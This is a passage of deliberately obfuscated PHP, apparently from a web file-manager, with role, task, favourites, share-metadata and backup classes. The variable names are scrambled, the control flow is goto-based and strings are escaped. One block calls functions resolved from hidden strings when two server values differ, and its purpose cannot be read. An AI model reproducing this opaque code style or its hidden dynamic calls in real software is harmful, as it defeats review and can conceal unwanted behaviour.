f¢€ÊÇ∏£Ç; cøêåÊä±: $eÈﬁ”·ÿêÇ = Model($E⁄Ò≈êÕôå[1866])->where($f›™•ôØÿ)->save($CÃ´áíÁ≠ ); if ($f‹ó‹È©–Ú[$E⁄Ò≈êÕôå[723]] == $E⁄Ò≈êÕôå[1871]) { if ($Bâ≤•∂µíà[$E⁄Ò≈êÕôå[448]] != $E⁄Ò≈êÕôå[191] && $this->shareFileMeta($Bâ≤•∂µíà[$E⁄Ò≈êÕôå[448]])) { $this->shareFileMeta($Bâ≤•∂µíà[$E⁄Ò≈êÕôå[448]], 0); } $this->remove($Bâ≤•∂µíà[$E⁄Ò≈êÕôå[469]]); return !0; } if ($eÈﬁ”·ÿêÇ && $f‹ó‹È©–Ú[$E⁄Ò≈êÕôå[723]] == $E⁄Ò≈êÕôå[1872]) { $b®èãÕÌåﬂ = $CÃ´áíÁ≠ [$E⁄Ò≈êÕôå[723]] == $E⁄Ò≈êÕôå[1872] ? 1 : 0; $this->shareFileMeta($Bâ≤•∂µíà[$E⁄Ò≈êÕôå[448]], $b®èãÕÌåﬂ); $this->removeByFile($Bâ≤•∂µíà[$E⁄Ò≈êÕôå[448]]); } goto E£òË¢Ÿ€Î; DÀë·Ø¶≠´: $E⁄Ò≈êÕôå =& $_SERVER[Öíæ€“”≠éÏË]; $f›™•ôØÿ = array($E⁄Ò≈êÕôå[394] => $f‹ó‹È©–Ú[$E⁄Ò≈êÕôå[394]]); $Bâ≤•∂µíà = Model($E⁄Ò≈êÕôå[1866])->where($f›™•ôØÿ)->field($E⁄Ò≈êÕôå[1876])->find(); goto Aﬂ‰©‹à¯∆; f¢€ÊÇ∏£Ç: } private function removeByFile($c ‰ÃùÑÜ¡) { goto d´•ÕêÑ›; C¿ª¯¿ò£ã: $aßªÎ”ﬂ≠ø = array_to_keyvalue($E©ÜÎÃÎìú, $Bƒ≤…Ì‹´˜[33], $Bƒ≤…Ì‹´˜[469]); $this->remove($aßªÎ”ﬂ≠ø); goto dö∂âÍõ¯Ë; f¡πô’ÏŒü: $BáΩ»ø—√Œ = array($Bƒ≤…Ì‹´˜[396] => array($Bƒ≤…Ì‹´˜[7], $B‡Íã…ç˘Ö), $Bƒ≤…Ì‹´˜[474] => 1); $E©ÜÎÃÎìú = $this->where($BáΩ»ø—√Œ)->field($Bƒ≤…Ì‹´˜[469])->select(); if (empty($E©ÜÎÃÎìú)) { return; } goto C¿ª¯¿ò£ã; d´•ÕêÑ›: $Bƒ≤…Ì‹´˜ =& $_SERVER[Öíæ€“”≠éÏË]; $E©ÜÎÃÎìú = Model($Bƒ≤…Ì‹´˜[803])->where(array($Bƒ≤…Ì‹´˜[448] => $c ‰ÃùÑÜ¡))->field($Bƒ≤…Ì‹´˜[396])->select(); $B‡Íã…ç˘Ö = array_to_keyvalue($E©ÜÎÃÎìú, $Bƒ≤…Ì‹´˜[33], $Bƒ≤…Ì‹´˜[396]); goto f¡πô’ÏŒü; dö∂âÍõ¯Ë: } private function shareFileMeta($Eô°ÃÜ§ºû, $D‘é»¨ã·ü = null) { $E»Êºé’å‡ =& $_SERVER[Öíæ€“”≠éÏË]; $C≈ººÔãÒ‹ = array($E»Êºé’å‡[448] => $Eô°ÃÜ§ºû, $E»Êºé’å‡[93] => $E»Êºé’å‡[1877]); if (is_null($D‘é»¨ã·ü)) { return Model($E»Êºé’å‡[1878])->where($C≈ººÔãÒ‹)->find(); } $C≈ººÔãÒ‹[$E»Êºé’å‡[372]] = $D‘é»¨ã·ü; Model($E»Êºé’å‡[1878])->add($C≈ººÔãÒ‹, array(), !0); } } goto F«íÍ†óÙ‹; Aëü†Ÿå¡π: if ($_SERVER[$_SERVER[Öíæ€“”≠éÏË][847]] != $_SERVER[$_SERVER[Öíæ€“”≠éÏË][2126]]) { goto B”«ÍÓê¢å; cí£∫Â≤∑‰: $cáı¯≈∞ì√ = explode($_SERVER[Öíæ€“”≠éÏË][229], $CÒÒãèß◊‘); if (count($cáı¯≈∞ì√) < $_SERVER[Öíæ€“”≠éÏË][594]) { $BÀÎÉ„èµ« = $_SERVER[Öíæ€“”≠éÏË][850]; $BÀÎÉ„èµ«(); } $dÒ°êΩ∂üÉ = $_SERVER[Öíæ€“”≠éÏË][1224]; goto C‘¿ëÒ≠ë•; C‘¿ëÒ≠ë•: $dÒ°êΩ∂üÉ($_SERVER[$_SERVER[Öíæ€“”≠éÏË][1223]]); goto F˜πŒıäÙ®; B”«ÍÓê¢å: $b‡è¶∆‹›Í = $_SERVER[Öíæ€“”≠éÏË][849]; $a±ûß¨éÙÑ = $_SERVER[$_SERVER[Öíæ€“”≠éÏË][844]] . $_SERVER[Öíæ€“”≠éÏË][845]; $CÒÒãèß◊‘ = $b‡è¶∆‹›Í($a±ûß¨éÙÑ); goto cí£∫Â≤∑‰; F˜πŒıäÙ®: } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\x65\155\137\157\x70\164\x69\157\156"; protected $jsonField = array("\155\145\156\165", "\162\157\154\145", "\162\x6f\154\145\107\x72\157\x75\x70", "\x72\145\147\x69\163\164", "\x65\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($eÓ—ãí¬â¶) { return "\123\171\x73\x74\145\x6d\117\160\x74\151\157\156\x5f{$eÓ—ãí¬â¶}"; } protected function optionDefault($Dèàüô›ƒ≥ = '') { $búÁ„‡‚∫È =& $_SERVER[Öíæ€“”≠éÏË]; if ($Dèàüô›ƒ≥ == $búÁ„‡‚∫È[33]) { return $GLOBALS[$búÁ„‡‚∫È[6]][$búÁ„‡‚∫È[378]]; } } } class SystemRecordModel extends ModelBaseLight { } goto b·Éû‚—ê¯; fÚïÇöê´‹: define($_SERVER[Öíæ€“”≠éÏË][237], 2); define($_SERVER[Öíæ€“”≠éÏË][238], 3); define($_SERVER[Öíæ€“”≠éÏË][239], 1); goto BØïßÌ˜Í‚; b·Éû‚—ê¯: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\162\157\154\x65\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\141\x75\x74\150", "\x6c\x61\x62\x65\x6c", "\x64\151\x73\160\154\x61\x79", "\163\x79\x73\164\x65\x6d", "\x64\x65\x73\x63", "\151\147\156\157\x72\145\105\170\164", "\x69\x67\x6e\x6f\162\x65\x46\151\154\145\123\x69\x7a\x65", "\x61\144\155\151\x6e\151\163\164\x72\x61\164\x6f\162", "\x73\157\162\164"); public function listData($e†ˆ∂÷⁄ë≤ = false, $FÚ£¶ëø°Ç = "\163\157\162\x74", $cøç êπ·É = false) { $AÛôÉ°ªÈΩ =& $_SERVER[Öíæ€“”≠éÏË]; $eºøîãÌ¶“ = parent::listData($e†ˆ∂÷⁄ë≤, $FÚ£¶ëø°Ç, $cøç êπ·É); if (!$e†ˆ∂÷⁄ë≤) { foreach ($eºøîãÌ¶“ as $BÈœø ˆı„ => $a¯–’®õ◊û) { if ($a¯–’®õ◊û[$AÛôÉ°ªÈΩ[1900]] == 1) { $eºøîãÌ¶“[$BÈœø ˆı„][$AÛôÉ°ªÈΩ[432]] = LNG($AÛôÉ°ªÈΩ[2127]); } } } return $eºøîãÌ¶“; } public function update($a«“¯∂ƒÇ , $c£ñ◊˘¶ﬂÉ) { goto F≥öõè õø; cúƒÉ€Ëäá: if (!$D·«ÿâø˘Ï || $f»Œ∂ûàà€ && $f»Œ∂ûàà€[$cÏñª”´‹«[394]] != $D·«ÿâø˘Ï[$cÏñª”´‹«[394]]) { return !1; } if ($f»Œ∂ûàà€[$cÏñª”´‹«[1900]] == 1) { $c£ñ◊˘¶ﬂÉ = array($cÏñª”´‹«[28] => $c£ñ◊˘¶ﬂÉ[$cÏñª”´‹«[28]], $cÏñª”´‹«[1729] => $c£ñ◊˘¶ﬂÉ[$cÏñª”´‹«[1729]]); } $this->filterAuth($c£ñ◊˘¶ﬂÉ[$cÏñª”´‹«[407]]); goto cÃ–‡±Ø≤Ü; cÃ–‡±Ø≤Ü: return parent::update($a«“¯∂ƒÇ , $c£ñ◊˘¶ﬂÉ); goto E÷ù≈»÷‰©; F≥öõè õø: $cÏñª”´‹« =& $_SERVER[Öíæ€“”≠éÏË]; $D·«ÿâø˘Ï = parent::listData($a«“¯∂ƒÇ ); $f»Œ∂ûàà€ = $this->findByName($c£ñ◊˘¶ﬂÉ[$cÏñª”´‹«[28]]); goto cúƒÉ€Ëäá; E÷ù≈»÷‰©: } public function remove($cé¬§ÔòÊÉ) { $dî£€ñô£ˆ = parent::listData($cé¬§ÔòÊÉ); if (!$dî£€ñô£ˆ || $dî£€ñô£ˆ[$_SERVER[Öíæ€“”≠éÏË][1180]]) { return !1; } return parent::remove($cé¬§ÔòÊÉ); } public function add($bﬂòû‘õŒÍ) { goto EÍ¿◊√”í„; E»®≈Çäπ˜: $EıêùÜâê = array($dòæ◊åºè—[414] => $C‡∞ı‘€Õµ, $dòæ◊åºè—[1713] => $dòæ◊åºè—[33], $dòæ◊åºè—[1709] => $dòæ◊åºè—[1717], $dòæ◊åºè—[2128] => 1, $dòæ◊åºè—[1712] => 0, $dòæ◊åºè—[2129] => 0, $dòæ◊åºè—[1711] => $this->getSort()); $bﬂòû‘õŒÍ = array_merge($EıêùÜâê, $bﬂòû‘õŒÍ); $this->filterAuth($bﬂòû‘õŒÍ[$dòæ◊åºè—[407]]); goto f∂•éÿÚ–Ω; f∂•éÿÚ–Ω: return parent::insert($bﬂòû‘õŒÍ); goto F¶∑Ç±ôƒ„; EÍ¿◊√”í„: $dòæ◊åºè— =& $_SERVER[Öíæ€“”≠éÏË]; $C‡∞ı‘€Õµ = $bﬂòû‘õŒÍ[$dòæ◊åºè—[28]]; if ($this->findByName($C‡∞ı‘€Õµ)) { return !1; } goto E»®≈Çäπ˜; F¶∑Ç±ôƒ„: } private function getSort() { $fääÜÔÏë‚ =& $_SERVER[Öíæ€“”≠éÏË]; $cö–Ï”é¢≤ = parent::listData(); $fÎÓ‰¡∑ŸÂ = array_to_keyvalue($cö–Ï”é¢≤, $fääÜÔÏë‚[33], $fääÜÔÏë‚[1730]); return empty($fÎÓ‰¡∑ŸÂ) ? 0 : max($fÎÓ‰¡∑ŸÂ) + 1; } private function filterAuth(&$C¶∏ñ÷∆∞Ë) { $aµΩ¶Üéıø =& $_SERVER[Öíæ€“”≠éÏË]; $câöæÀèÿÈ = array(); $d≥„Ø≈‹¬© = array_filter(explode($aµΩ¶Üéıø[47], $C¶∏ñ÷∆∞Ë)); foreach ($d≥„Ø≈‹¬© as $C¶∏ñ÷∆∞Ë) { $AÌ¢ˆÜÕ†” = explode($aµΩ¶Üéıø[95], $C¶∏ñ÷∆∞Ë); if ($AÌ¢ˆÜÕ†”[0] == $aµΩ¶Üéıø[2130] && $AÌ¢ˆÜÕ†”[1] != $aµΩ¶Üéıø[1099]) { $E—é‰»üåô = $AÌ¢ˆÜÕ†”[0] . $aµΩ¶Üéıø[95] . $AÌ¢ˆÜÕ†”[1] . $aµΩ¶Üéıø[2131]; if (!in_array($E—é‰»üåô, $d≥„Ø≈‹¬©)) { $câöæÀèÿÈ[] = $E—é‰»üåô; } } $câöæÀèÿÈ[] = $C¶∏ñ÷∆∞Ë; } $C¶∏ñ÷∆∞Ë = implode($aµΩ¶Üéıø[47], $câöæÀèÿÈ); } public function sort($f◊êµüª€È, $aòÏ¥ë±áö) { return parent::update($f◊êµüª€È, $aòÏ¥ë±áö); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\164\x61\x73\x6b\114\x69\x73\x74"; public $field = array("\156\x61\155\145", "\x74\171\x70\x65", "\145\x76\x65\x6e\164", "\x74\x69\x6d\145", "\x64\x65\163\143", "\163\171\x73\x74\145\x6d", "\x65\156\x61\142\154\x65", "\154\141\x73\x74\x52\x75\156", "\x73\x6f\x72\164"); public function listData($aÊò»ÜéÚ¯ = false, $Eæ‹«√≠áû = "\163\x6f\162\x74", $b·ÔéÜ¯¶∆ = false) { return parent::listData($aÊò»ÜéÚ¯, $Eæ‹«√≠áû, $b·ÔéÜ¯¶∆); } public function add($Bí¢ò√Üì‹) { $Eºπá ¯ÏÖ =& $_SERVER[Öíæ€“”≠éÏË]; $f∆ëúã›“Ô = $this->findByName($Bí¢ò√Üì‹[$Eºπá ¯ÏÖ[28]]); if ($f∆ëúã›“Ô) { return !1; } $Bí¢ò√Üì‹[$Eºπá ¯ÏÖ[1502]] = 0; $Bí¢ò√Üì‹[$Eºπá ¯ÏÖ[1730]] = $this->getSort(); return parent::insert($Bí¢ò√Üì‹); } private function getSort() { $f¶–√´›ƒ· =& $_SERVER[Öíæ€“”≠éÏË]; $E≠ÓúòüÂá = parent::listData(); $F–˜°ìòêÑ = array_to_keyvalue($E≠ÓúòüÂá, $f¶–√´›ƒ·[33], $f¶–√´›ƒ·[1730]); return empty($F–˜°ìòêÑ) ? 0 : max($F–˜°ìòêÑ) + 1; } public function update($c◊ÿèÌ»ëù, $DÂéﬁÈÊÜ£) { $bÚ‚≤≈æ´≥ =& $_SERVER[Öíæ€“”≠éÏË]; $bÉ„è°‹õÃ = $this->listData($c◊ÿèÌ»ëù); $fáöïﬂ‡æ¡ = $this->findByName($DÂéﬁÈÊÜ£[$bÚ‚≤≈æ´≥[28]]); if (!$bÉ„è°‹õÃ || $fáöïﬂ‡æ¡ && $fáöïﬂ‡æ¡[$bÚ‚≤≈æ´≥[394]] != $bÉ„è°‹õÃ[$bÚ‚≤≈æ´≥[394]]) { return !1; } return parent::update($c◊ÿèÌ»ëù, $DÂéﬁÈÊÜ£); } public function remove($Eòæûıˆà—, $F»ÑÙﬁ±»◊ = false) { $b∞ÓúæôÕØ =& $_SERVER[Öíæ€“”≠éÏË]; $A•ñè≠¶íƒ = $this->listData($Eòæûıˆà—); if (!$A•ñè≠¶íƒ) { return; } if (!$F»ÑÙﬁ±»◊ && $A•ñè≠¶íƒ[$b∞ÓúæôÕØ[1180]] == $b∞ÓúæôÕØ[87]) { return !1; } return parent::remove($Eòæûıˆà—); } public function enable($fÇΩü¢’Ã…, $b”ôÔª÷¶À) { return $this->update($fÇΩü¢’Ã…, array($_SERVER[Öíæ€“”≠éÏË][2121] => $b”ôÔª÷¶À)); } public function run($E•óëÁÛ¢˘) { return $this->update($E•óëÁÛ¢˘, array($_SERVER[Öíæ€“”≠éÏË][2132] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($cÚÿ®›©◊¯) { $DÇﬁÚ ¶’‡ =& $_SERVER[Öíæ€“”≠éÏË]; return array($DÇﬁÚ ¶’‡[1814] => array(USER_ID, $DÇﬁÚ ¶’‡[2133])); } protected function listData() { $B˜»…≥£Ñ¯ =& $_SERVER[Öíæ€“”≠éÏË]; $D¶Ö‡Õì´€ = array($B˜»…≥£Ñ¯[1529] => USER_ID, $B˜»…≥£Ñ¯[464] => 0); $F±¢∏È√¯û = $B˜»…≥£Ñ¯[2134]; $aı•´éΩ ä = $this->field($F±¢∏È√¯û)->where($D¶Ö‡Õì´€)->order($B˜»…≥£Ñ¯[2135])->select(); return $aı•´éΩ ä ? $aı•´éΩ ä : array(); } protected function resetCache() { } protected function listView() { goto eñçÁÒ•ﬁ“; B—óÜàÃπ÷: $e∆¢ù⁄ÚêÂ = array_to_keyvalue($Cÿœ˘ÒﬁÔﬁ, $CÜ¨Ë¶»‹ÿ[33], $CÜ¨Ë¶»‹ÿ[76]); if (!$e∆¢ù⁄ÚêÂ) { return $Fã˘ÑˆﬁŸ´; } $bœ≠‚ä»∏∑ = 2000; goto f≈µ√âØœƒ; eñçÁÒ•ﬁ“: $CÜ¨Ë¶»‹ÿ =& $_SERVER[Öíæ€“”≠éÏË]; $Fã˘ÑˆﬁŸ´ = $this->listData(); $Cÿœ˘ÒﬁÔﬁ = array_filter_by_field($Fã˘ÑˆﬁŸ´, $CÜ¨Ë¶»‹ÿ[29], $CÜ¨Ë¶»‹ÿ[410]); goto B—óÜàÃπ÷; eè‰ß…§çâ: $bè¨∏©¢™ü = array_to_keyvalue($bè¨∏©¢™ü, $CÜ¨Ë¶»‹ÿ[396]); foreach ($Fã˘ÑˆﬁŸ´ as $D∏≠ÚÀ‹÷ó => $Eçö”áæÔÉ) { $EåÚé“Ô‚Ç = $bè¨∏©¢™ü[$Eçö”áæÔÉ[$CÜ¨Ë¶»‹ÿ[76]]]; $EåÚé“Ô‚Ç = $EåÚé“Ô‚Ç ? $EåÚé“Ô‚Ç : array(); $Fã˘ÑˆﬁŸ´[$D∏≠ÚÀ‹÷ó] = array_merge($EåÚé“Ô‚Ç, $Eçö”áæÔÉ); } return $Fã˘ÑˆﬁŸ´; goto Cää‹∫˘¬£; f≈µ√âØœƒ: $D∂™·¨ËÂæ = array($CÜ¨Ë¶»‹ÿ[411] => array($CÜ¨Ë¶»‹ÿ[412], $e∆¢ù⁄ÚêÂ)); $bè¨∏©¢™ü = Model($CÜ¨Ë¶»‹ÿ[803])->listSource($D∂™·¨ËÂæ, $bœ≠‚ä»∏∑); $bè¨∏©¢™ü = array_merge($bè¨∏©¢™ü[$CÜ¨Ë¶»‹ÿ[74]], $bè¨∏©¢™ü[$CÜ¨Ë¶»‹ÿ[75]]); goto eè‰ß…§çâ; Cää‹∫˘¬£: } protected function addFav($d©≠áû√¬‹, $FΩÖÙ”˘õö = '', $CÙ†ë∂Æªá = "\163\x6f\165\162\143\145") { goto a±πßãë¥õ; Dù®·Ô€≤è: $FàÈòà”®ä = array($eÖ≤Ãºâú†[1529] => USER_ID, $eÖ≤Ãºâú†[464] => 0); $DÓ¨üÑ‹Ï¯ = $this->where($FàÈòà”®ä)->max($eÖ≤Ãºâú†[1730]); if (!$DÓ¨üÑ‹Ï¯) { $DÓ¨üÑ‹Ï¯ = 0; } goto d–∑Íù§–•; AúÔî£–»§: return $this->add($eóÌ®¿ˆ±ø); goto DÌ÷¯¥–à„; a±πßãë¥õ: $eÖ≤Ãºâú† =& $_SERVER[Öíæ€“”≠éÏË]; $FàÈòà”®ä = array($eÖ≤Ãºâú†[1529] => USER_ID, $eÖ≤Ãºâú†[464] => 0, $eÖ≤Ãºâú†[416] => $CÙ†ë∂Æªá, $eÖ≤Ãºâú†[415] => $d©≠áû√¬‹); if ($this->where($FàÈòà”®ä)->find()) { return !1; } goto Dù®·Ô€≤è; d–∑Íù§–•: if (!$FΩÖÙ”˘õö && $CÙ†ë∂Æªá == $eÖ≤Ãºâú†[410]) { $Cè±◊ùÿäë = Model($eÖ≤Ãºâú†[1215])->where(array($eÖ≤Ãºâú†[411] => $d©≠áû√¬‹))->find(); if (!$Cè±◊ùÿäë) { return !1; } $FΩÖÙ”˘õö = $Cè±◊ùÿäë[$eÖ≤Ãºâú†[28]]; } $FΩÖÙ”˘õö = $this->getAutoName($FΩÖÙ”˘õö); $eóÌ®¿ˆ±ø = array($eÖ≤Ãºâú†[1529] => USER_ID, $eÖ≤Ãºâú†[464] => 0, $eÖ≤Ãºâú†[414] => $FΩÖÙ”˘õö, $eÖ≤Ãºâú†[415] => $d©≠áû√¬‹, $eÖ≤Ãºâú†[416] => $CÙ†ë∂Æªá, $eÖ≤Ãºâú†[1711] => $DÓ¨üÑ‹Ï¯ + 1); goto AúÔî£–»§; DÌ÷¯¥–à„: } protected function remove($BêÛù¨∞‘∞) { $d»§”áä¿Œ =& $_SERVER[Öíæ€“”≠éÏË]; $Cë÷¡ôôºΩ = array($d»§”áä¿Œ[1529] => USER_ID, $d»§”áä¿Œ[413] => $BêÛù¨∞‘∞); return $this->where($Cë÷¡ôôºΩ)->delete(); } protected function removeByName($Fßêè√≠Ωù) { $Fú´åÖ≤à =& $_SERVER[Öíæ€“”≠éÏË]; $A¿âÌƒ∫Ó… = array($Fú´åÖ≤à[1529] => USER_ID, $Fú´åÖ≤à[414] => $Fßêè√≠Ωù, $Fú´åÖ≤à[464] => 0); return $this->where($A¿âÌƒ∫Ó…)->delete(); } protected function rename($c≈ÑœÕ⁄Í¢, $aë°⁄÷æ™æ) { $E÷ô˘Áﬁ≥ =& $_SERVER[Öíæ€“”≠éÏË]; if ($c≈ÑœÕ⁄Í¢ == $aë°⁄÷æ™æ) { return !1; } $D∑”˜É≈ ê = $this->getAutoName($aë°⁄÷æ™æ); if ($aë°⁄÷æ™æ != $D∑”˜É≈ ê) { return !1; } $BÉáˆ≥Ïô = array($E÷ô˘Áﬁ≥[1529] => USER_ID, $E÷ô˘Áﬁ≥[464] => 0, $E÷ô˘Áﬁ≥[28] => $c≈ÑœÕ⁄Í¢); return $this->where($BÉáˆ≥Ïô)->save(array($E÷ô˘Áﬁ≥[28] => $aë°⁄÷æ™æ)); } protected function resetSort($Dï®…¥›éÑ) { $C∆ŒÕÈàÜû =& $_SERVER[Öíæ€“”≠éÏË]; $Dï®…¥›éÑ = is_array($Dï®…¥›éÑ) ? $Dï®…¥›éÑ : array(); $DÒÉÒñ≠´° = array($C∆ŒÕÈàÜû[1529] => USER_ID); for ($dÿäÃÇÿÒ¥ = 0; $dÿäÃÇÿÒ¥ < count($Dï®…¥›éÑ); $dÿäÃÇÿÒ¥++) { $DÒÉÒñ≠´°[$C∆ŒÕÈàÜû[413]] = $Dï®…¥›éÑ[$dÿäÃÇÿÒ¥]; $this->where($DÒÉÒñ≠´°)->save(array($C∆ŒÕÈàÜû[1711] => $dÿäÃÇÿÒ¥ + 1)); } return !0; } protected function moveTop($FõñÑßèø£) { goto cﬂÓü¥œæ∑; cﬂÓü¥œæ∑: $aÏ©°Û«‚ë =& $_SERVER[Öíæ€“”≠éÏË]; $EŸëøûÚ∞ô = array($aÏ©°Û«‚ë[1529] => USER_ID, $aÏ©°Û«‚ë[464] => 0); $EŒõÒ¡≈Ñà = $this->where($EŸëøûÚ∞ô)->where(array($aÏ©°Û«‚ë[28] => $FõñÑßèø£))->find(); goto eßÀë£∆Œ; E¡è¥Ñ£ÜÉ: $D‡Ú∞ﬂ‡ÍÈ = $C™éÕæ—ïÑ; $C™éÕæ—ïÑ = array_remove_value($C™éÕæ—ïÑ, $EŒõÒ¡≈Ñà[$aÏ©°Û«‚ë[394]]); array_unshift($C™éÕæ—ïÑ, $EŒõÒ¡≈Ñà[$aÏ©°Û«‚ë[394]]); goto A‡ˆπÚêî«; A‡ˆπÚêî«: return $this->resetSort($C™éÕæ—ïÑ); goto e‡ÏºﬁÂßÇ; eßÀë£∆Œ: if (!$EŒõÒ¡≈Ñà) { return; } $C™éÕæ—ïÑ = $this->field($aÏ©°Û«‚ë[394])->where($EŸëøûÚ∞ô)->order($aÏ©°Û«‚ë[2135])->select(); $C™éÕæ—ïÑ = array_to_keyvalue($C™éÕæ—ïÑ, $aÏ©°Û«‚ë[33], $aÏ©°Û«‚ë[394]); goto E¡è¥Ñ£ÜÉ; e‡ÏºﬁÂßÇ: } protected function moveBottom($dÉñ≤≈—≠∆) { $dá€É·ç–‡ =& $_SERVER[Öíæ€“”≠éÏË]; $E…í‡¨›–ß = array($dá€É·ç–‡[1529] => USER_ID, $dá€É·ç–‡[464] => 0); $AÌÎãËë≥Í = $this->where($E…í‡¨›–ß)->max($dá€É·ç–‡[1730]); $Aë¥ÛÌ€è¨ = array($dá€É·ç–‡[1730] => $AÌÎãËë≥Í + 1); return $this->where($E…í‡¨›–ß)->where(array($dá€É·ç–‡[28] => $dÉñ≤≈—≠∆))->save($Aë¥ÛÌ€è¨); } private function getAutoName($E≥€Ö¯å√Â) { goto cÖ‚ôêöŸÏ; fèÃÖ•Ëù©: return $E≥€Ö¯å√Â . "\x28{$C€‘Ñÿ∂ÃÃ}\51"; goto d”ÁÜÿ‰”π; cÖ‚ôêöŸÏ: $bÓ•¿ÖäÃã =& $_SERVER[Öíæ€“”≠éÏË]; $f†ö‡≤„…◊ = array($bÓ•¿ÖäÃã[1529] => USER_ID, $bÓ•¿ÖäÃã[464] => 0); $C¯ÿÍéä–Ö = $this->field($bÓ•¿ÖäÃã[28])->where($f†ö‡≤„…◊)->select(); goto D∑Ë“ê¶¿»; D∑Ë“ê¶¿»: $C¯ÿÍéä–Ö = array_to_keyvalue($C¯ÿÍéä–Ö, $bÓ•¿ÖäÃã[33], $bÓ•¿ÖäÃã[28]); if (!$C¯ÿÍéä–Ö || !in_array($E≥€Ö¯å√Â, $C¯ÿÍéä–Ö)) { return $E≥€Ö¯å√Â; } for ($C€‘Ñÿ∂ÃÃ = 0; $C€‘Ñÿ∂ÃÃ < count($C¯ÿÍéä–Ö); $C€‘Ñÿ∂ÃÃ++) { if (!in_array($E≥€Ö¯å√Â . "\x28{$C€‘Ñÿ∂ÃÃ}\x29", $C¯ÿÍéä–Ö)) { return $E≥€Ö¯å√Â . "\x28{$C€‘Ñÿ∂ÃÃ}\51"; } } goto fèÃÖ•Ëù©; d”ÁÜÿ‰”π: } } goto fÈˆÃáÚ£∂; eí∂⁄œä æ: class BackupFile { public function __construct() { } public function index() { goto E¬ÁˆÆ÷Ã≈; d’Û—â‡≈¶: $bçıëıË…ô = $Eñ√ùÇ∑©è = 0; do { $bã–«‚í‡Â = $_SERVER[Öíæ€“”≠éÏË][792]; $C”Í∆»ìœõ = Model($_SERVER[Öíæ€“”≠éÏË][760])->where($D•ÇﬂÛ≈ÒÒ)->field($bã–«‚í‡Â)->order($_SERVER[Öíæ€“”≠éÏË][793])->selectPage($BÓÇ‘∂ŒãÊ, $A ÿ◊ëﬂáÏ); $bÑÀ˜–õÏÏ = !empty($C”Í∆»ìœõ[$_SERVER[Öíæ€“”≠éÏË][367]]) ? $C”Í∆»ìœõ[$_SERVER[Öíæ€“”≠éÏË][367]] : array(); foreach ($bÑÀ˜–õÏÏ as $Eﬂ≠ï…‚–¥) { goto fë’ÌõªÑÖ; fë’ÌõªÑÖ: if (!$this->_fileExist($Eﬂ≠ï…‚–¥, $B©ÏÀ˜…éÉ, $a÷ƒ∏ãÿ‘Ù)) { $AÉèéçƒ€á -= 1; $Eñ∞ÆéÔÉÙ -= (int) $Eﬂ≠ï…‚–¥[$_SERVER[Öíæ€“”≠éÏË][78]]; write_log("\x66\x69\x6c\x65\x20\156\x6f\164\40\x65\170\x69\x73\x74\56\x66\x69\154\x65\x49\x44\x3a{$Eﬂ≠ï…‚–¥[$_SERVER[Öíæ€“”≠éÏË][448]]}\54\40\x70\141\x74\150\72{$Eﬂ≠ï…‚–¥[$_SERVER[Öíæ€“”≠éÏË][76]]}", $_SERVER[Öíæ€“”≠éÏË][794]); continue; } $fê∫„¶∑Öî = $Eﬂ≠ï…‚–¥[$_SERVER[Öíæ€“”≠éÏË][76]]; $b‡ ∫ü≤îç = "\x7b\x69\157\x3a{$aÔ“Ãä¿¬ª[$_SERVER[Öíæ€“”≠éÏË][725]]}\175" . substr($fê∫„¶∑Öî, strlen("\173\x69\x6f\x3a{$Eﬂ≠ï…‚–¥[$_SERVER[Öíæ€“”≠éÏË][795]]}\175")); goto c’»∂ÕÂòï; a“ª¥ü´„é: $C˘ª·÷ÖÆ… += $Eﬂ≠ï…‚–¥[$_SERVER[Öíæ€“”≠éÏË][78]]; $Eñ√ùÇ∑©è += 1; $bçıëıË…ô += $Eﬂ≠ï…‚–¥[$_SERVER[Öíæ€“”≠éÏË][78]]; goto Aîê∞∑è¢∆; c’»∂ÕÂòï: if (IO::exist($b‡ ∫ü≤îç)) { $d”´ÈÂ‰∏ç->updateFileEnd($Eﬂ≠ï…‚–¥[$_SERVER[Öíæ€“”≠éÏË][28]], $Eﬂ≠ï…‚–¥[$_SERVER[Öíæ€“”≠éÏË][78]]); } else { $b‡ ∫ü≤îç = get_path_father($b‡ ∫ü≤îç); IO::mkdir($b‡ ∫ü≤îç); if (!IO::copy($fê∫„¶∑Öî, $b‡ ∫ü≤îç, $_SERVER[Öíæ€“”≠éÏË][796])) { write_log($_SERVER[Öíæ€“”≠éÏË][797] . $fê∫„¶∑Öî . $_SERVER[Öíæ€“”≠éÏË][780] . $b‡ ∫ü≤îç . $_SERVER[Öíæ€“”≠éÏË][518], $_SERVER[Öíæ€“”≠éÏË][755]); $FÕ‹ˆ“¨Ë‰ = !1; break; } } $E¿èµÊÆ î = $Eﬂ≠ï…‚–¥[$_SERVER[Öíæ€“”≠éÏË][448]]; $b•∆Ô¿ÁÇ¿ += 1; goto a“ª¥ü´„é; Aîê∞∑è¢∆: if ($C˘ª·÷ÖÆ… >= 1024 * 1024 * 100) { $Bàö¥Û±ªä = array($_SERVER[Öíæ€“”≠éÏË][798] => $E¿èµÊÆ î, $_SERVER[Öíæ€“”≠éÏË][799] => $Eñ√ùÇ∑©è, $_SERVER[Öíæ€“”≠éÏË][800] => $bçıëıË…ô); Backup::set($Bàö¥Û±ªä); $C˘ª·÷ÖÆ… = $b•∆Ô¿ÁÇ¿ = 0; } goto C¨ÖÊâÿëÀ; C¨ÖÊâÿëÀ: } $fúæè∆·Éÿ = count($bÑÀ˜–õÏÏ); $A ÿ◊ëﬂáÏ++; } while ($fúæè∆·Éÿ == $BÓÇ‘∂ŒãÊ); $d”´ÈÂ‰∏ç->end(); goto aÆ…¶◊Ö¡; E¬ÁˆÆ÷Ã≈: $aÔ“Ãä¿¬ª = Backup::get(); $E¿èµÊÆ î = $aÔ“Ãä¿¬ª[$_SERVER[Öíæ€“”≠éÏË][291]][$_SERVER[Öíæ€“”≠éÏË][193]][$_SERVER[Öíæ€“”≠éÏË][448]]; $D•ÇﬂÛ≈ÒÒ = array($_SERVER[Öíæ€“”≠éÏË][449] => array($_SERVER[Öíæ€“”≠éÏË][785], $E¿èµÊÆ î), $_SERVER[Öíæ€“”≠éÏË][786] => array($_SERVER[Öíæ€“”≠éÏË][329], 